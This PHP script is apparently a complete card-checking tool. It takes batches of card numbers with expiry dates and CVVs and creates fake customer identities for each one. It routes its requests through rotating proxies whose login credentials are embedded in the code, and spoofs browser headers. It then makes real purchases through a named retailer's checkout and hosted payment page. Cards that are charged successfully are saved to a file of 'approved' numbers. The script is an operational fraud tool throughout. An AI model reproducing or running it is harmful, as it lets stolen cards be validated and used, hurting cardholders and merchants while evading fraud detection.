<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');
set_time_limit(0);

is_dir('COOKIE') || mkdir('COOKIE', 0755, true);

$d = __DIR__ . '/COOKIE';

$ii = [
  'cookie' => $d . '/' . mt_rand() . '.txt'
];


ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/error_log.txt');

// Test mode check
if (isset($_GET['test']) && $_GET['test'] === 'true') {
  echo json_encode(['status' => 'success', 'message' => 'Test mode active']);
  exit;
}


function generateWebKitBoundary($length = 16)
{
  $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  $charactersLength = strlen($characters);
  $randomString = '';

  for ($i = 0; $i < $length; $i++) {
    $randomString .= $characters[rand(0, $charactersLength - 1)];
  }

  return $randomString;
}




function eut($ako, $ay, $pogi)
{
  $ikawba = explode($ay, $ako);
  $ikawba = explode($pogi, $ikawba[1]);
  return $ikawba[0];
}

function usPhone()
{
  $areaCode = mt_rand(2, 9) . mt_rand(0, 9) . mt_rand(0, 9);
  $exchangeCode = mt_rand(2, 9) . mt_rand(0, 9) . mt_rand(0, 9);
  $subscriberNumber = mt_rand(1000, 9999);
  $phoneNumber = "1" . $areaCode . $exchangeCode . $subscriberNumber;

  return $phoneNumber;
}


function fname($z1 = 5)
{
  $u2 = '';
  $x3 = array("a", "e", "i", "o", "u");
  $c4 = array('b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z');
  $f5 = $z1 / 2;
  for ($y6 = 1; $y6 <= $f5; $y6++) {
    $u2 .= $c4[rand(0, 19)];
    $u2 .= $x3[rand(0, 4)];
  }
  return $u2;
}

function lname($z1 = 7)
{
  $u2 = '';
  $x3 = array("a", "e", "i", "o", "u");
  $c4 = array('b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z');
  $f5 = $z1 / 2;
  for ($y6 = 1; $y6 <= $f5; $y6++) {
    $u2 .= $c4[rand(0, 19)];
    $u2 .= $x3[rand(0, 4)];
  }
  return $u2;
}

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  exit;
}

function formatPublicKey($key)
{
  $key = wordwrap($key, 64, "\n", true);
  return $key;
}



if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $input = file_get_contents('php://input');
  $cards = json_decode($input, true);

  if (!is_array($cards)) {
    echo json_encode(['error' => 'Invalid input']);
    exit;
  }

  $processedCards = [];

  foreach ($cards as $card) {
    $ccs = explode("|", $card);

    if (count($ccs) !== 4) {
      $processedCards[] = ['card' => $card, 'status' => 'declined', 'message' => 'Error'];
      continue;
    }

    $cc = $ccs[0];

    $mes = $ccs[1];
    $ano = $ccs[2];
    $ano2 = substr($ano, -2);
    $cvv = $ccs[3];



    $name = fname();
    $last = lname();
    $email = $name . $last . rand(111111, 999999) . '@gmail.com';
    $pass = $name . rand(11111, 99999);
    $phone = rand(11111111111, 88888888888);
    $ukpostal = chr(rand(65, 90)) . chr(rand(65, 90)) . rand(0, 9) . " " . rand(0, 9) . chr(rand(65, 90)) . chr(rand(65, 90));
    $canadapostal = chr(rand(65, 90)) . rand(0, 9) . chr(rand(65, 90)) . " " . rand(0, 9) . chr(rand(65, 90)) . rand(0, 9);
    $caphone =
      sprintf('(705) %03d-%04d', rand(200, 999), rand(1000, 9999));
    $usPhone = usPhone();
    $d1 = getcwd();
    $d = str_replace('\\', '/', $d1);

    $userAgents = [
      // Chrome on Windows
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',

      // Chrome on macOS
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',

      // Firefox on Windows
      'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',

      // Firefox on macOS
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0',

      // Safari on iOS
      'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',

      // Chrome on Android
      'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
      'Mozilla/5.0 (Linux; Android 9; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36',

      // Opera on Windows
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.137',

      // Edge on Windows
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.864.48 Safari/537.36 Edg/91.0.864.48'
    ];


    $referers = [
      'https://www.google.com/',
      'https://www.bing.com/',
      'https://www.yahoo.com/',
      'https://www.facebook.com/',
      'https://www.twitter.com/',
      'https://www.linkedin.com/',
      'https://www.reddit.com/',
      'https://www.amazon.com/',
      'https://www.ebay.com/',
      'https://www.netflix.com/',
      'https://www.wikipedia.org/',
      'https://www.quora.com/',
      'https://www.medium.com/',
      'https://www.alhambrawater.com/',
      'https://www.news.com/',
      'https://www.nytimes.com/',
      'https://www.washingtonpost.com/',
      'https://www.theguardian.com/',
      'https://www.bbc.com/',
      'https://www.instagram.com/',
      'https://www.github.com/',
      'https://www.stackoverflow.com/',
      'https://www.adobe.com/',
      'https://www.spotify.com/',
      'https://www.apple.com/',
      'https://www.microsoft.com/',
      'https://www.twitch.tv/',
      'https://www.aljazeera.com/',
      'https://www.cnn.com/',
      'https://www.theatlantic.com/',
      'https://www.imdb.com/',
      'https://www.tumblr.com/',
      'https://www.pinterest.com/',
      'https://www.dropbox.com/',
      'https://www.wordpress.com/',
      'https://www.flickr.com/',
      'https://www.yelp.com/',
      'https://www.etsy.com/',
      'https://www.airbnb.com/',
      'https://www.booking.com/',
      'https://www.uber.com/',
      'https://www.lyft.com/',
      'https://www.wikipedia.org/',
      'https://www.nationalgeographic.com/',
      'https://www.walmart.com/',
      'https://www.target.com/',
      'https://www.costco.com/',
      'https://www.nike.com/',
      'https://www.adidas.com/',
      'https://www.bestbuy.com/',
      'https://www.homedepot.com/',
      'https://www.lowes.com/',
      'https://www.verizon.com/',
      'https://www.att.com/',
      'https://www.samsung.com/',
      'https://www.hulu.com/',
      'https://www.disneyplus.com/',
      'https://www.espn.com/',
      'https://www.forbes.com/',
      'https://www.businessinsider.com/',
      'https://www.bloomberg.com/',
      'https://www.wsj.com/',
      'https://www.time.com/',
      'https://www.cnbc.com/',
      'https://www.theverge.com/',
      'https://www.techcrunch.com/',
      'https://www.engadget.com/',
      'https://www.mashable.com/',
      'https://www.zdnet.com/',
      'https://www.wired.com/',
      'https://www.vogue.com/',
      'https://www.nike.com/',
      'https://www.pepsi.com/',
      'https://www.coca-cola.com/',
      'https://www.mcdonalds.com/',
      'https://www.burgerking.com/',
      'https://www.subway.com/',
      'https://www.kfc.com/',
      'https://www.pizzahut.com/',
      'https://www.dominos.com/',
      'https://www.starbucks.com/',
      'https://www.dunkindonuts.com/',
      'https://www.chick-fil-a.com/'
    ];



    $userAgent = $userAgents[array_rand($userAgents)];
    $referer = $referers[array_rand($referers)];
    $webkit = generateWebKitBoundary();


    $proxies = [
      [
        'proxy' => "geo.iproyal.com:12321",
        'credentials' => "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us"
      ],
      [
        'proxy' => "brd.superproxy.io:22225",
        'credentials' => "brd-customer-hl_9658b3d0-zone-data_center-country-au-session-rand552371896:putanginamo123"
      ]
    ];


    $selectedProxy = $proxies[array_rand($proxies)];


    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://cmafh.com//addQuick.aspx?0.8270595518182022");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_POST, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, 'qty=1&invmastid=1542937');
    $h = array();
    $h[] = 'accept: */*';
    $h[] = 'content-type: application/x-www-form-urlencoded';
    $h[] = 'origin: https://cmafh.com';
    $h[] = 'referer: https://cmafh.com/details/9584-1542937/Eaton+E47+Precision+-+Basic+Switches/E47BML01.aspx';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g1 = curl_exec($g);
    curl_close($g);


    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://cmafh.com/checkout.aspx");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_HTTPGET, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    $g2 = curl_exec($g);
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://cmafh.com/getiframe.aspx?dt=Y");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_HTTPGET, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    $h = array();
    $h[] = 'accept: text/html, */*; q=0.01';
    $h[] = 'x-requested-with: XMLHttpRequest';
    $h[] = 'origin: https://cmafh.com';
    $h[] = 'referer: https://cmafh.com/checkout.aspx';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g3 = curl_exec($g);
    $transid = eut($g3, "<iframe id='ifrm' name='ifrm' src='https://transaction.hostedpayments.com/?TransactionSetupID=", "' ");
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://transaction.hostedpayments.com/?TransactionSetupID=$transid");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_HTTPGET, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    $h = array();
    $h[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    $h[] = 'referer: https://cmafh.com/';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g4 = curl_exec($g);
    $__VIEWSTATE = eut($g4, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '" />');
    $__VIEWSTATEGENERATOR = eut($g4, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '" />');
    $__EVENTVALIDATION = eut($g4, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '" />');
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://transaction.hostedpayments.com/?TransactionSetupID=$transid");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_POST, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, 'scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=' . urlencode($__VIEWSTATE) . '&__VIEWSTATEGENERATOR=' . urlencode($__VIEWSTATEGENERATOR) . '&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=' . urlencode($__EVENTVALIDATION) . '&hdnCancelled=&errorParms=&eventPublishTarget=&cardNumber=' . $cc . '&ddlExpirationMonth=' . $mes . '&ddlExpirationYear=' . $ano2 . '&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&hdnEncoded=&__ASYNCPOST=true&');
    $h = array();
    $h[] = 'accept: */*';
    $h[] = 'x-requested-with: XMLHttpRequest';
    $h[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
    $h[] = 'origin: https://transaction.hostedpayments.com';
    $h[] = 'referer: https://transaction.hostedpayments.com/?TransactionSetupID=' . $transid . '';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g5 = curl_exec($g);
    $nurl = eut($g5, "|ScriptContentNoTags|redirect('", "')");
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, $nurl);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_HTTPGET, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    $h = array();
    $h[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    $h[] = 'referer: https://transaction.hostedpayments.com/';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g55 = curl_exec($g);
    curl_close($g);


    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://cmafh.com/checkout.aspx");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_POST, 1);
    curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, 'btnSubmit=Submit&txtShipId=&txtEmail=' . $email . '&txtPhone=98' . rand(11111111, 88888888) . '&txtFirstName=' . $name . '&txtLastName=' . $last . '&txtCompanyName=&txtStreet=' . rand(1000, 9000) . '+W+Honeysuckle+Ave&txtStreet2=&txtCity=Hayden&txtState=IL&txtZip=83835&txtCountry=USA&txtFreight=19281&hiddenfreight=&txtPONumber=' . rand(111111, 999999) . '&txtTransType=CC&hddnCCNumber=xxxxxxxxxxxx' . substr($cc, -4) . '&txtCCType=visamcard&txtBillFirstName=' . $name . '&txtBillLastName=' . $last . '&txtBillCompanyName=&txtBillStreet=' . rand(1000, 9000) . '+W+Honeysuckle+Ave&txtBillStreet2=&txtBillCity=Hayden&txtBillState=IL&txtBillZip=83835&txtBillCountry=USA&recaphddn2=verified');
    $h = array();
    $h[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    $h[] = 'content-type: application/x-www-form-urlencoded';
    $h[] = 'origin: https://cmafh.com';
    $h[] = 'referer: https://cmafh.com/checkout.aspx';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g6 = curl_exec($g);
    $oid = curl_getinfo($g, CURLINFO_EFFECTIVE_URL);
    $query = parse_url($oid, PHP_URL_QUERY);
    parse_str($query, $params);
    $oidNumber = $params['oid'];

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://cmafh.com/processorder.aspx?cid=$oidNumber&_=1723449095687");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_HTTPGET, 1);
    // curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    $h = array();
    $h[] = 'accept: text/html, */*; q=0.01';
    $h[] = 'x-requested-with: XMLHttpRequest';
    $h[] = 'referer: https://cmafh.com/confirmation.aspx?oid=' . $oidNumber . '';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g7 = curl_exec($g);

    if ($g7 == "ERROR") {
      $g = curl_init();
      curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
      curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
      curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
      curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
      curl_setopt($g, CURLOPT_URL, "https://cmafh.com/getHovCart.aspx?0.6468183627487964");
      curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($g, CURLOPT_HTTPGET, 1);
      // curl_setopt($g, CURLOPT_HEADER, 1);
      curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
      $h = array();
      $h[] = 'accept: */*';
      $h[] = 'referer: https://cmafh.com/confirmation.aspx?oid=' . $oidNumber . '';
      $h[] = 'user-agent: ' . $userAgent . '';
      curl_setopt($g, CURLOPT_HTTPHEADER, $h);
      $errorGet1 = curl_exec($g);

      $g = curl_init();
      curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
      curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
      curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
      curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
      curl_setopt($g, CURLOPT_URL, "https://cmafh.com/checkout.aspx?error=y");
      curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($g, CURLOPT_HTTPGET, 1);
      // curl_setopt($g, CURLOPT_HEADER, 1);
      curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
      $h = array();
      $h[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
      $h[] = 'referer: https://cmafh.com/confirmation.aspx?oid=' . $oidNumber . '';
      $h[] = 'user-agent: ' . $userAgent . '';
      curl_setopt($g, CURLOPT_HTTPHEADER, $h);
      $errorGet = curl_exec($g);
    } else {
      preg_match('/<b>Order Number: <\/b>(\d+)/', $g7, $matches);
    }

    $msg = eut($errorGet, 'and error - ', '</div>');

    if (!empty($matches[1])) {
      $orderNumber = $matches[1];
      $processedCards[] = ['card' => $card, 'status' => 'approved', 'message' => "Charged 20USD| $orderNumber"];
      fwrite(fopen("approvedCCN.txt", "a"), $card . "\r\n");
    } elseif (empty($msg)) {
      $processedCards[] = ['card' => $card, 'status' => 'Error', 'message' => 'Error in API. Check logs.'];
    } elseif (stripos($msg, 'Address and zip code do not match')) {
      $processedCards[] = ['card' => $card, 'status' => 'approved', 'message' => $msg];
    } else {
      $processedCards[] = ['card' => $card, 'status' => 'declined', 'message' => "$msg"];
    }



    curl_close($g);
  }

  echo json_encode($processedCards);
}